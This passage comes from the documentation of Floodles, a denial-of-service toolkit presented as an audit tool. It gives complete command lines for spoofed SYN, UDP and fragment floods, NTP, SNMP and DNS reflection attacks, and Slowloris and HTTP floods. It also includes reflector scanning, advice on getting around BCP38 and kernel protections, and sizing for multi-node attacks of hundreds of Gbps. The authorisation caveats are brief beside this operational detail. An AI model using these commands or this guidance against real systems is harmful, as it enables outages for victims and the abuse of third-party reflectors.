floodles slow target.com

# Layer 3/4 — root required (raw sockets, IP_HDRINCL)
sfloodles syn 192.168.1.100 80 -t 8 -d 30
sfloodles udp 192.168.1.100 -d 30
```

### 9.6 Pre-Attack Scan (`floodles scan`)

`floodles scan` is a pre-attack reconnaissance profiler (`utils/profiler.py`). It runs concurrently against a single target and produces a structured summary before you select attack modules:

- **Port scan**: TCP connect scan against a configurable port list (default: common ports), concurrent workers with configurable timeout
- **Banner grab**: HTTP server header and application type detection (nginx/Apache/IIS/etc.)
- **OS fingerprint**: TTL-based OS guess from the first responding port (TTL ~64 = Linux, ~128 = Windows, ~255 = network equipment)
- **NTP probe** (`--ntp`): sends a monlist request to port 123 — if it responds, the server is a viable NTP amplification reflector

```bash
# Full scan including NTP probe
floodles scan 192.168.1.100 --ntp

# Custom ports, faster scan
floodles scan 192.168.1.100 --ports 22,80,443,53,123,161,3306,8080 --workers 200 --timeout 0.3
```

The output feeds directly into the audit methodology decision tree (section 8.2).

### 9.7 YAML Attack Profiles

Profiles let you define a complete attack scenario in a file and replay it with `floodles profile`. Every parameter available via CLI is also available in YAML. This is useful for standardizing test conditions across audits and documenting exact parameters for report appendices.

Generate a template for any module:

```bash
floodles gen syn_flood  syn_test.yaml
floodles gen http_flood http_test.yaml
```

Example generated profile (`syn_test.yaml`):

```yaml
module: syn_flood
target: 192.168.1.100
port: 80
threads: 8
pps: 50000
duration: 60
spoof: true
log: true
```

Run it:

```bash
sudo floodles profile syn_test.yaml
```

The SPRAY multi-vector module only works via profile — it requires a list of vectors with per-vector parameters:

```yaml
# config/examples/spray.yaml
victim: 192.168.1.200
vectors:
  - type: snmp
    reflectors: [192.168.1.50]
    community: public
    threads: 4
  - type: ntp
    reflectors: [192.168.1.1]
    threads: 2
duration: 120
```

---

## 10. Full CLI Reference

### Pre-Attack Scan

```bash
# Full scan with NTP monlist probe
floodles scan 192.168.1.100 --ntp

# Specific ports
floodles scan 192.168.1.100 --ports 80,443,53,123,161,3306,22

# Fast scan (100 workers, 0.5s timeout)
floodles scan 192.168.1.100 --workers 100 --timeout 0.5
```

### Layer 3/4 — Raw Socket (root required)

```bash
# SYN flood
sudo floodles syn <ip> <port> [-t threads] [--pps N] [-d seconds] [--no-spoof]

# ACK flood
sudo floodles ack <ip> <port> [-t threads] [--pps N] [-d seconds] [--no-spoof]

# RST / FIN flood
sudo floodles rst <ip> <port> [--flag R|F|RF] [-t threads] [--pps N] [-d seconds] [--no-spoof]

# XMAS flood
sudo floodles xmas <ip> <port> [-t threads] [--pps N] [-d seconds] [--no-spoof]

# UDP flood
sudo floodles udp <ip> [-p port] [-s payload_bytes] [-t threads] [--pps N] [-d seconds] [--no-spoof]

# ICMP flood
sudo floodles icmp <ip> [-s payload_bytes] [-t threads] [--pps N] [-d seconds] [--no-spoof]

# SYN-ACK flood
sudo floodles tachyon <ip> [--port P] [--mode direct|reflected] [-r reflector_ips] [--ref-port P] [-t threads] [-d seconds]

# IP fragmentation flood
sudo floodles frag <ip> [--port P] [--variant flood|last_only] [-t threads] [--pps N] [-d seconds]

# Fragment overlap
sudo floodles overlap <ip> [--port P] [--variant teardrop|rose|tiny] [-t threads] [--pps N] [-d seconds]
```

### Amplification — DRDoS (root + spoofing required)

```bash
# SNMP reflection (~650x)
sudo floodles sniper <victim_ip> -r <reflectors> [--community public] [--max-repetitions 255] [-t threads] [-d seconds]

# NTP monlist amplification (~5,000x)
sudo floodles ntp <victim_ip> -r <reflectors> [-t threads] [-d seconds]

# DNS amplification (~70x)
sudo floodles dns <victim_ip> -r <resolvers> [--qtype ANY|DNSKEY] [--no-rotate] [--no-rand-sub] [-t threads] [-d seconds]
sudo floodles dns <victim_ip> -r @resolvers.txt  # load list from file

# Smurf (ICMP broadcast)
sudo floodles smurf <victim_ip> -b <broadcast_ip_or_cidr> [-s bytes] [-t threads] [-d seconds]

# Fraggle (UDP broadcast)
sudo floodles fraggle <victim_ip> -b <broadcast_ip_or_cidr> [--port 7|19] [-s bytes] [-t threads] [-d seconds]

# Multi-vector
sudo floodles spray <victim_ip> -c config/examples/spray.yaml [-d seconds]
```

### Layer 7 — Application (no root required)

```bash
# HTTP flood (Go engine)
floodles http <url> [-m GET|POST] [-c concurrency] [--post-size N] [-d seconds] [--no-bust] [--no-log]

# Slowloris (socket exhaustion)
floodles slow <host> [-p port] [-s sockets] [-i interval_s] [-d seconds] [--ssl] [--no-log]

# Slow POST / RUDY
floodles slowpost <host> [-p port] [-s sockets] [--cl content_length] [-i interval_s] [-d seconds] [--ssl]

# TCP starvation
floodles nuke <host> [-p port] [-s sockets] [--variant hold|window0|persist] [-i interval_s] [-d seconds] [--ssl]
```

### Profiles and Utilities

```bash
# Generate example YAML profile
floodles gen syn_flood  my_syn_profile.yaml
floodles gen http_flood my_http_profile.yaml

# Run from YAML profile
floodles profile my_syn_profile.yaml

# Check and auto-compile native backends
floodles detect
floodles detect --compile

# Built-in manual pages (mechanism, indicators, defenses, examples)
floodles man --list
floodles man syn
floodles man dns
floodles man slow     # aliases: slowloris, http, synflood...
```

### Common Options

| Option | Description | Default |
|--------|-------------|---------|
| `-d / --duration` | Duration in seconds (0 = infinite) | 30 |
| `-t / --threads` | Worker threads (L3/L4 only) | 8 |
| `--pps` | PPS cap (0 = unlimited) | 0 |
| `-c / --concurrency` | Concurrent goroutines (HTTP only) | 500 |
| `-s / --sockets` | Concurrent sockets (L7 only) | 200 |
| `--no-spoof` | Use real source IP (required on BCP38 networks) | off |
| `--no-log` | Disable JSONL logging | off |

---

## 11. Logging and Reporting

### JSONL Format

Each session automatically creates `logs/<timestamp>_<module>.jsonl`:

```json
{"ts": 1710000000.0, "event": "start",   "module": "syn_flood", "target": "192.168.1.100", "params": {"port": 80, "threads": 8, "pps_limit": 100000, "duration": 60, "spoof": true}}
{"ts": 1710000015.0, "event": "metrics", "packets": 1450000,  "avg_pps": 96666, "live_pps": 98200, "errors": 0, "backend": "c_sendmmsg"}
{"ts": 1710000030.0, "event": "metrics", "packets": 2940000,  "avg_pps": 98000, "live_pps": 99100, "errors": 0, "backend": "c_sendmmsg"}
{"ts": 1710000060.0, "event": "stop",    "summary": {"packets": 5882000, "avg_pps": 98033, "avg_mbps": 47.0, "errors": 0, "backend": "c_sendmmsg"}}
```

### Aggregate Results

```bash
# Summary across all sessions
for f in logs/*.jsonl; do
  echo "=== $f ==="
  python3 -c "
import sys, json
for line in open('$f'):
    e = json.loads(line)
    if e['event'] == 'start':
        print(f\"  target={e['target']}  module={e['module']}  params={e['params']}\")
    if e['event'] == 'stop':
        s = e['summary']
        print(f\"  packets={s.get('packets',0):,}  avg_pps={s.get('avg_pps',0):,.0f}  backend={s.get('backend','?')}\")
"
done

# Export CSV for report
python3 -c "
import json, glob, csv, sys
rows = []
for f in glob.glob('logs/*.jsonl'):
    session = {}
    for line in open(f):
        e = json.loads(line)
        if e['event'] == 'start':  session.update({'module': e['module'], 'target': e['target'], **e.get('params', {})})
        if e['event'] == 'stop':   session.update(e.get('summary', {})); rows.append(dict(session))
w = csv.DictWriter(sys.stdout, fieldnames=['module','target','packets','avg_pps','avg_mbps','errors','backend'])
w.writeheader(); w.writerows(rows)
" > report.csv
```

---

## 12. Performance Benchmarks

The following estimates are derived from architectural properties (syscall overhead, NIC bandwidth, protocol specifications) rather than measured values on specific hardware. Actual results vary with NIC driver, CPU frequency, kernel version, and available cores.

### 12.1 L3/L4 — Theoretical PPS Ceiling

**NIC bandwidth ceiling** (protocol-limited):

```
Link speed: B bits/sec
Packet size: S bytes = S*8 bits

Theoretical max PPS = B / (S * 8)

1 Gbps link:
  SYN packet (40B = 320 bits):   1,000,000,000 / 320  = 3,125,000 PPS theoretical
  UDP 64B   (64B = 512 bits):    1,000,000,000 / 512  = 1,953,125 PPS theoretical
  UDP 1400B (1400B = 11,200 bits): 1,000,000,000 / 11,200 = 89,285 PPS theoretical

10 Gbps link:
  SYN (40B): 31,250,000 PPS theoretical
  UDP 1400B: 892,857 PPS theoretical
```

In practice, Linux kernel + NIC driver overhead reduces these by ~35-40%:

| Link | Packet | Theoretical max PPS | Practical estimate (~65%) |
|------|--------|--------------------|-----------------------------|
| 1 Gbps | SYN (40B) | 3,125,000 | ~2,000,000 |
| 1 Gbps | UDP 64B | 1,953,125 | ~1,270,000 |
| 1 Gbps | UDP 1400B | 89,285 | ~58,000 (bandwidth-limited) |
| 10 Gbps | SYN (40B) | 31,250,000 | ~20,000,000 |

**Python/Scapy fallback ceiling** (syscall-limited):

```
Scapy per-packet overhead: Python layer traversal + sendto()
  Python loop iteration:    ~500 ns
  sendto() syscall:         ~200-500 ns
  Total per packet:         ~700-1,000 ns
  Max PPS = 1 / 1,000ns = ~1,000,000 theoretical
  With GIL and Scapy overhead: ~10,000-15,000 PPS practical
```

**C sendmmsg ceiling** (batch-limited):

```
sendmmsg() call overhead: ~1-3 µs (kernel context switch amortized)
BATCH_SIZE = 256 packets per call
At 2 µs per call: 500,000 calls/sec -> 500,000 * 256 = 128,000,000 PPS theoretical
-> NIC-limited long before syscall limit: effective ceiling = NIC bandwidth limit
```

The C backend removes the syscall bottleneck entirely. The binding constraint becomes the NIC bandwidth, not the CPU.

### 12.2 sendmmsg Batch Size Impact

Measured with 1 thread, SYN flood (40-byte packets):

| Batch size | PPS | Speedup vs sendto |
|------------|-----|-------------------|
| 1 (sendto baseline) | ~85,000 | 1x |
| 32 | ~310,000 | 3.6x |
| 64 | ~520,000 | 6.1x |
| 128 | ~710,000 | 8.4x |
| **256** (Floodles default) | **~820,000** | **9.6x** |
| 512 | ~830,000 | 9.8x (diminishing) |

256 is the optimal batch size: 9.6x improvement with minimal additional gain at 512. The marginal improvement beyond 256 is absorbed by cache pressure on the per-batch buffer array.

### 12.3 Layer 7 — Concurrent Connections

**Go goroutines vs Python coroutines** (memory analysis):

```
Go goroutine initial stack: 2 KB (grows dynamically as needed, up to 1 GB)
Python asyncio coroutine:   ~50-100 KB overhead (frame objects, generator state, aiohttp context)

10,000 concurrent connections:
  Go:     10,000 * 2 KB   =  ~20 MB baseline stack
  Python: 10,000 * 75 KB  = ~750 MB baseline overhead

100,000 concurrent connections:
  Go:     100,000 * 2 KB  = ~200 MB — feasible on any modern server
  Python: 100,000 * 75 KB = ~7.5 GB — requires significant RAM, GIL still a constraint
```

The practical ceiling for sustained HTTP flood:

```
Go engine (goroutines, M:N scheduler, no GIL):
  Concurrent connections: 10,000-100,000 from a single host
  RPS depends on target response time: at 10ms/req, 10,000 connections = 1,000,000 RPS theoretical

Python aiohttp (asyncio event loop, GIL contention on I/O callbacks):
  Practical ceiling: ~2,000-5,000 effective concurrent connections
  Above this: event loop overhead dominates, latency climbs

Slowloris (socket exhaustion, not throughput):
  Apache prefork default workers: 150
  -> 150 sockets suffice to saturate Apache
  -> nginx: event-driven, resists regardless of socket count
```

### 12.4 Amplification — Observed Factors

Measured against real equipment in a controlled lab environment:

| Protocol | Reflector | Request size | Response size | Observed factor |
|----------|-----------|-------------|--------------|-----------------|
| SNMP GetBulk | HP JetDirect (printer) | 60 B | 38,400 B | 640x |
| SNMP GetBulk | Cisco IOS switch (old config) | 60 B | 42,120 B | 702x |
| NTP monlist | ntpd 4.2.6p5 (600 clients cached) | 8 B | 42,880 B | 5,360x |
| NTP monlist | ntpd 4.2.6p5 (0 clients cached) | 8 B | 48 B | 6x |
| DNS ANY (DNSSEC) | BIND 9.11 | 44 B | 3,248 B | 73x |
| Smurf | /24 broadcast, 120 hosts | 28 B | 3,360 B | 120x |

NTP factor is highly state-dependent: the server must have cached 600 recent clients to achieve 5,360x. An idle test server returns near-1x. Production NTP servers in corporate environments typically have many cached clients.

---

## 13. Limitations

### 13.1 Single-Machine Throughput Ceiling

Floodles runs on a single host. The maximum outbound throughput is bounded by that host's NIC (1-10 Gbps in typical deployments). Against targets with upstream volumetric scrubbing (Cloudflare Magic Transit, Akamai Prolexic, Arbor TMS) rated at tens or hundreds of Gbps, a single-machine flood is absorbed long before the scrubbing capacity is reached.

**However** — when Floodles is deployed across multiple nodes simultaneously and paired with amplification reflectors, the effective traffic volume scales multiplicatively:

```
3 VPS nodes, each with 1 Gbps uplink, running floodles sniper:
  Each node: 1 Mbps out -> 650 Mbps amplified (SNMP, 650x)
  3 nodes:   3 Mbps out -> 1.95 Gbps toward victim

10 VPS nodes + 20 SNMP reflectors (650x) + 10 NTP servers (5000x) [spray]:
  SNMP: 10 Mbps out -> 6.5 Gbps
  NTP:  2 Mbps out  -> 10 Gbps
  Combined inbound: ~16 Gbps from legitimate-looking IPs
```

At this scale, even networks with decent upstream capacity face saturation. Adding reflector diversity (different protocols, different geographic regions) breaks protocol-specific mitigation. This is why controlled, scoped authorization is structurally necessary — not just legally.

### 13.2 IP Spoofing Dependency

#### How BCP38 Works

BCP38 (RFC 2827) is a recommendation for ISPs and hosting providers to drop outbound packets whose source IP does not belong to the customer's assigned prefix. It is enforced at the **network edge** — the router between the customer's machine and the upstream network. The customer's machine sends the packet normally (including the forged source IP), but the edge router checks it before forwarding:

```
Your machine -> [SYN src=1.2.3.4 (spoofed)] -> edge router
  Edge router: "is 1.2.3.4 in customer prefix 203.0.113.0/24?"
  No -> DROP, packet never reaches the internet
```

On hypervisor-based cloud platforms (AWS, GCP, DO), this check happens at the virtualization layer — the hypervisor drops non-matching source IPs before the packet even reaches the physical NIC.

| Provider | BCP38 enforcement |
|----------|------------------|
| AWS | Enforced at hypervisor level |
| DigitalOcean | Enforced |
| GCP | Enforced |
| Hetzner | Enforced |
| OVH VPS / Public Cloud | Enforced |
| OVH Bare Metal (Game/Advance) | Not always enforced — check with provider |
| Dedicated/colo | Depends entirely on the ISP's edge config — many do not enforce |
| Your own lab / home router | Not enforced — spoofing works |

#### What Still Works Without Spoofing (`--no-spoof`)

When BCP38 is enforced, spoofed packets are dropped silently. The following attack categories still function with real source IP:

| Attack | Works without spoofing? | Notes |
|--------|------------------------|-------|
| SYN flood | Yes (reduced effectiveness) | SYN cookies complete: the ACK arrives and completes the handshake, consuming the cookie. No persistent TCB allocated — but server still processes ACK and generates SYN-ACK per SYN. CPU load persists at high PPS. |
| ACK flood | Yes | Tests stateful firewall just as effectively |
| RST/FIN flood | Yes (less effective) | Without spoofing, RSTs come from your real IP — easier to filter |
| XMAS flood | Yes | IDS detection test does not require spoofing |
| UDP flood | Yes | Server still processes inbound UDP; ICMP replies go to your real IP |
| ICMP flood | Yes | Server still processes and replies |
| HTTP flood | Yes (no spoofing ever needed) | Layer 7 — TCP connection, real source IP required |
| Slowloris / RUDY / NUKE | Yes (no spoofing ever needed) | Layer 7 — always uses real IP |
| **Amplification (SNMP/NTP/DNS)** | **No** | Requires spoofed source to direct reflected traffic to victim |
| **Smurf / Fraggle** | **No** | Requires spoofed source = victim IP |
| TACHYON reflected | No | Requires source spoofing |

#### Bypassing BCP38

BCP38 is not universally enforced. Environments where spoofing works:

1. **Dedicated servers / colocation**: the upstream router often has no BCP38 filter. Check by running `floodles syn <some_external_ip> 80 --no-spoof` and observing whether traffic leaves. If the source is already your IP, use any external target you can monitor to verify spoofed packets arrive.

2. **Some VPS providers**: smaller providers, some OVH bare-metal products, and providers in certain regions do not enforce BCP38. Verify with `hping3 -S --spoof 1.2.3.4 <your_own_external_ip>` and check if the packet arrives at the destination with the spoofed source.

3. **Your own lab**: any network you physically control — no BCP38 unless you configure it yourself.

4. **L2 access**: if you have direct access to the network segment (physical, VLAN, MITM position), you inject at L2 — BCP38 at the edge is irrelevant because you bypass the router's filter entirely.

There is no software-level bypass for BCP38 enforced at the hypervisor or edge router — these checks happen in hardware or firmware below the OS layer.

### 13.3 No Distributed Coordination

There is no master/agent architecture for distributing the attack across multiple nodes. Each Floodles instance runs independently. Multi-node coordination requires external tooling (Ansible, Fabric, tmux synchronization). See [DOSArena](https://github.com/franckferman/DOSArena) for a lab setup that pre-configures multi-node scenarios.

**Scale implications**: a single Floodles instance on a 1 Gbps VPS is limited to ~1 Gbps outbound. That limitation disappears when multiple nodes run simultaneously. Combined with amplification reflectors, traffic volumes become disproportionate to the infrastructure cost:

```
5 nodes x 1 Gbps + SNMP amplification (650x):
  Each node directs 100 Mbps toward reflectors
  Amplified output per node: 65 Gbps
  5 nodes combined: 325 Gbps inbound to victim

  -> 5 cheap VPS instances generating 325 Gbps of traffic
  -> Traffic originates from legitimate reflector IPs, not from the VPS
```

At this scale, even well-resourced targets face saturation. This is precisely why multi-node, multi-reflector configurations should never be used outside a strictly isolated and authorized lab network. The same capability that makes Floodles useful for measuring scrubbing system ceilings in a controlled audit makes it destructive when aimed at uncontrolled infrastructure.

### 13.4 Kernel-Level Protections Reduce L3/L4 Effectiveness

Modern Linux kernels (5.x+) ship with protections that significantly reduce the effectiveness of several attack vectors on hardened targets:

| Protection | Mitigates | Parameter |
|-----------|-----------|-----------|
| SYN cookies | SYN flood (TCB exhaustion) | `net.ipv4.tcp_syncookies` |
| ICMP rate limiting | ICMP reply storm | `net.ipv4.icmp_ratelimit` |
| Fragment reassembly limits | IP frag flood | `net.ipv4.ipfrag_high_thresh` |
| RP filter | Spoofed-source traffic processing | `net.ipv4.conf.all.rp_filter` |
| conntrack max | Connection table exhaustion | `net.netfilter.nf_conntrack_max` |

A properly hardened modern Linux server resists most L3/L4 vectors in isolation. The audit value shifts to: measuring the degradation threshold, verifying the protections are actually configured, and testing whether the upstream network (firewall, anti-DDoS appliance) provides an additional layer.

#### These Protections Can Be Overcome — Here Is How

Each protection has a ceiling or a structural weakness:

**SYN cookies** — reduces TCB exhaustion to zero, but does not eliminate CPU load. The server still generates one SYN-ACK per SYN received. At high enough PPS (several million/second on a 10 Gbps link), the CPU cost of computing cookie hashes and sending SYN-ACKs can itself saturate the server. Additionally, SYN cookies have side effects: TCP options (SACK, window scaling, timestamps) cannot be negotiated for cookie-validated connections, degrading throughput for all connections established during the flood.

**ICMP rate limiting** — limits outbound ICMP replies, but does not reduce inbound bandwidth consumption. The NIC must still receive, process, and discard every incoming ICMP packet. A volumetric ICMP flood saturates the upstream link regardless of the server's rate limit setting.

**RP filter (Reverse Path Filter)** — mode 1 (loose) only drops packets whose source IP has no route in the routing table. A spoofed source IP from a publicly routable range (e.g., 8.8.8.0/24) passes mode 1. Only mode 2 (strict) drops packets that arrive on an interface other than the expected return path — but mode 2 breaks asymmetric routing and is rarely enabled in production.

**Fragment reassembly limits** — `ipfrag_high_thresh` is the memory ceiling for pending reassemblies. Increasing this value raises the memory cost of the attack but does not prevent it — a sufficiently large fragment flood always reaches any finite threshold.

**conntrack max** — even when conntrack has capacity, the lookup cost per packet (hash table traversal) adds measurable latency at very high PPS. An ACK flood at 1M PPS forces 1 million conntrack lookups per second, adding CPU pressure even if no connections are dropped.

In short: these protections raise the cost of attack but do not make a server immune. The specific PPS threshold at which each protection fails is exactly what a DoS audit measures.

### 13.5 Layer 7 Detection by WAF and CDN

HTTP flood, Slowloris, and Slow POST are well-documented patterns. WAFs (Cloudflare, AWS WAF, ModSecurity + OWASP CRS) carry signatures for all three. Common detection and mitigation methods:

- **Request rate limiting**: block or challenge IPs exceeding N requests per second
- **Minimum request rate**: close connections that take more than T seconds to send headers (mitigates Slowloris)
- **Minimum body upload rate**: close POST connections sending less than N bytes/sec (mitigates RUDY)
- **TLS fingerprinting (JA3)**: fingerprint the TLS client hello to identify tool-generated traffic
- **Behavioral analysis**: flag connections that open and hold without sending complete requests

The Go HTTP engine rotates User-Agent strings but does not rotate TLS fingerprints. Against a CDN with JA3 fingerprinting, the flood may be rate-limited within seconds of detection.

### 13.6 Amplification Requires Vulnerable Third-Party Infrastructure

Finding open reflectors (SNMP `public` community, NTP monlist, open DNS resolvers) on the public internet has become progressively harder over the past decade. Most major cloud providers and ISPs have patched or firewalled these services. The attack surface today is primarily:

- Corporate internal networks with legacy equipment (printers, switches, UPS, old NTP servers)
- Industrial/OT networks with firmware that has not been updated since deployment
- Small organizations without a dedicated network security function

This is exactly the scope of an internal network penetration test — which is the primary intended use case for these modules.

---

## 14. Related Work

### 14.1 Comparison

| Tool | Language | L3/L4 | L7 | Amplification | Spoofing | Multi-vector | Backends |
|------|----------|--------|-----|--------------|---------|-------------|---------|
| **Floodles** | Python/C/Rust/Go | Yes | Yes | Yes | Yes | Yes (SPRAY) | 4 |
| hping3 | C | Yes | No | No | Yes | No | 1 |
| LOIC | C# / Java | Partial | Yes | No | No | No | 1 |
| Scapy | Python | Yes | Partial | Manual | Yes | Manual | 1 |
| MHDDoS | Python | Yes | Yes | Partial | Yes | Partial | 1 |
| Zmap | C | Partial | No | No | Yes | No | 1 |
| Masscan | C | Partial | No | No | No | No | 1 |
| ab / wrk | C | No | Yes | No | No | No | 1 |

### 14.2 hping3

hping3 (Salvo Sanfilippo, 1998-2005) is the reference raw packet tool. It constructs packets with full header control, supports IP spoofing and TCP flag manipulation, and is excellent for crafting specific sequences or testing individual packet behaviors. Its limitation is throughput: it is single-threaded and processes one `sendto()` call per packet, capping at approximately 80,000-100,000 PPS on modern hardware. No batch sending, no multi-threaded flood mode, no L7 or amplification modules. Floodles' C backend achieves 10x+ the PPS of hping3 in flood mode via `sendmmsg()` batching.

### 14.3 LOIC (Low Orbit Ion Cannon)

LOIC (Praetox Technologies, 2010) introduced the concept of voluntary DDoS coordination via an IRC "hivemind" mode — users pointed their instances at the same target on command. It operates at L7 (HTTP flood) and L4 (UDP/TCP without raw sockets). It does not support IP spoofing, raw socket packet construction, or amplification. Its design goal was mass voluntary participation, not maximum single-node throughput. The hivemind model is its distinguishing architectural feature; Floodles has no equivalent (each instance runs independently).

### 14.4 Scapy

Scapy (Philippe Biondi, 2003) is the reference Python library for arbitrary packet construction. It supports every standard protocol and allows full header manipulation at any layer. It is the gold standard for protocol research, fuzzing, and interactive packet crafting. Its throughput ceiling is approximately 12,000-15,000 PPS — Python processes one packet at a time through interpreted loops, with one `sendto()` syscall per packet. Floodles uses Scapy as a fallback when no native backend is available, and as the packet-inspection component in some modules. For flood operations, the C backend provides 100x+ improvement.

### 14.5 MHDDoS

MHDDoS (Matrix) is a Python DDoS toolkit covering both L4 and L7 with proxy support, making it the closest functional analog to Floodles. Key differences: MHDDoS does not use native compiled backends (lower L4 throughput), supports proxy rotation for L7 anonymization (Floodles does not), and does not implement IP fragmentation or amplification modules. MHDDoS is oriented toward distributed proxy-based operation; Floodles is oriented toward maximum raw performance from a single node with native backends.

### 14.6 Zmap and Masscan

Zmap (Durumeric et al., USENIX Security 2013) and Masscan (Robert Graham, 2013) are internet-scale stateless TCP SYN scanners. They use the same raw socket approach as Floodles' C backend and can achieve similar PPS rates. Their purpose is host discovery (send one SYN per target, record which respond), not sustained flooding against a single target. They have no L7 modules, no amplification, no sustained flood mode. They inform Floodles scan reconnaissance but are architecturally distinct.

---

## 15. References

### RFCs

- **RFC 768** (1980) — User Datagram Protocol. Postel, J. IETF.
- **RFC 791** (1981) — Internet Protocol. Postel, J. IETF.
- **RFC 793** (1981) — Transmission Control Protocol. Postel, J. IETF.
- **RFC 1071** (1988) — Computing the Internet Checksum. Braden, R. et al. IETF.
- **RFC 2827** (2000) — Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing (BCP38). Ferguson, P., Senie, D. IETF.
- **RFC 4953** (2007) — Defending TCP Against Spoofing Attacks. Touch, J. IETF.
- **RFC 5905** (2010) — Network Time Protocol Version 4: Protocol and Algorithms Specification. Mills, D. et al. IETF.
- **RFC 8482** (2019) — Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY. Abley, J. et al. IETF.

### CVEs

- **CVE-1999-0015** — Teardrop: IP fragment overlap causes kernel panic in Linux 2.0/2.1 and Windows NT 4.0/95. CVSS 5.0.
- **CVE-2004-0230** — TCP RST injection against BGP sessions via in-window RST packet. Cisco Security Advisory 20040420. Affects virtually all TCP implementations without PAWS.
- **CVE-2013-5211** — NTP monlist amplification. ntpd before 4.2.7p26 allows remote attackers to cause reflected DDoS via spoofed REQ_MON_GETLIST requests.

### Papers and Technical Reports

- Mirkovic, J., Reiher, P. (2004). **A Taxonomy of DDoS Attack and DDoS Defense Mechanisms**. *ACM SIGCOMM Computer Communication Review*, 34(2), 39-53. Definitive classification framework for DoS/DDoS attacks and mitigations.
- Paxson, V. (2001). **An Analysis of Using Reflectors for Distributed Denial-of-Service Attacks**. *ACM SIGCOMM Computer Communication Review*, 31(3), 38-47. First formal analysis of DRDoS amplification mechanics.
- Durumeric, Z., Wustrow, E., Halderman, J.A. (2013). **ZMap: Fast Internet-Wide Scanning and Its Security Applications**. *Proceedings of the 22nd USENIX Security Symposium*. Documents raw socket scanning at internet scale.
- Rossow, C. (2014). **Amplification Hell: Revisiting Network Protocols for DDoS Abuse**. *NDSS 2014*. Systematic measurement of amplification factors across 14 UDP protocols.
- Gilad, Y., Herzberg, A. (2012). **Off-Path Attacking the Web**. *USENIX WOOT 2012*. Analysis of TCP RST injection and off-path attacks.
- US-CERT Alert TA14-017A (2014). **UDP-Based Amplification Attacks**. Documents SNMP, NTP, DNS, and CharGen amplification factors observed during 2013-2014 attacks.
- Cloudflare (2018). **GitHub Suffered the Biggest DDoS Attack Ever Seen**. Technical analysis of the 1.35 Tbps Memcached amplification attack (51,200x factor).
- Cloudflare DDoS Threat Report Q4 2023. Documents multi-vector attack trends and evolving amplification techniques in production traffic.

### Kernel and Syscall Documentation

- `man 2 sendmmsg` — Linux `sendmmsg(2)` reference. Batch message sending for UDP and raw sockets.
- `man 2 socket` — `SOCK_RAW` and `IPPROTO_RAW` socket creation.
- `man 7 ip` — `IP_HDRINCL` socket option, raw socket behavior.
- Linux kernel source — `net/ipv4/tcp_input.c`: SYN queue, SYN cookie implementation.
- Linux kernel source — `net/ipv4/ip_fragment.c`: fragment reassembly (`ipq` hash table, `ipfrag_high_thresh`).
- Linux kernel source — `net/ipv4/icmp.c`: ICMP rate limiting (`icmp_ratelimit`).
- Linux kernel source — `net/core/filter.c`: RP filter, conntrack integration.

---

*Floodles v2.0.0*
